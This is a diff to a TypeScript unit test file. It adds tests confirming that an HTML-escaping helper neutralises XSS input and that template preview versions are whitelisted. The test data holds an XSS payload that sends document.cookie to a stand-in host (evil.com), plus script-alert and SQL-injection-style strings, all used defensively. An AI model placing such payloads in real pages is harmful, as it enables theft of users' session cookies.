@@ -6,6 +6,7 @@ import {
   getStoreDeepDiff,
   SECTOR_DATA_MAP,
 } from "@/lib/admin/qa/migration-diff-engine";
+import { escapeHtml } from "@/app/api/qa/template-preview/[code]/route";
 
 describe("F40 US-F40-12 Visual Parity Inspector Unit Tests", () => {
   it("[TC-F40-12-01] calculates clip-path coordinates for SwipeSlider at various slider percentages", () => {
@@ -74,4 +75,32 @@ describe("F40 US-F40-12 Visual Parity Inspector Unit Tests", () => {
     expect(safeSandbox.includes("allow-same-origin")).toBe(false);
     expect(safeSandbox.includes("allow-scripts")).toBe(true);
   });
+
+  it("[TC-F40-12-06] escapes HTML special characters to prevent reflected XSS in template-preview error responses", () => {
+    // Test XSS payload vectors injected into code or error message
+    const maliciousScript = '<script>alert("XSS")</script>';
+    const maliciousImg = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
+    const maliciousQuote = "test' OR '1'='1\";";
+
+    expect(escapeHtml(maliciousScript)).toBe("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
+    expect(escapeHtml(maliciousScript)).not.toContain("<script>");
+    expect(escapeHtml(maliciousImg)).toBe("&lt;img src=x onerror=&quot;fetch(&#039;https://evil.com/steal?cookie=&#039;+document.cookie)&quot;&gt;");
+    expect(escapeHtml(maliciousImg)).not.toContain("<img");
+    expect(escapeHtml(maliciousQuote)).toBe("test&#039; OR &#039;1&#039;=&#039;1&quot;;");
+  });
+
+  it("[TC-F40-12-07] whitelists template preview versions to only pw1 and pw2", () => {
+    const sanitizeVersion = (rawVersion: string): "pw1" | "pw2" => {
+      const v = rawVersion.toLowerCase().trim();
+      return v === "pw2" ? "pw2" : "pw1";
+    };
+
+    expect(sanitizeVersion("pw1")).toBe("pw1");
+    expect(sanitizeVersion("pw2")).toBe("pw2");
+    expect(sanitizeVersion("PW2")).toBe("pw2");
+    expect(sanitizeVersion("pw3")).toBe("pw1");
+    expect(sanitizeVersion("<script>")).toBe("pw1");
+    expect(sanitizeVersion("")).toBe("pw1");
+  });
 });
+
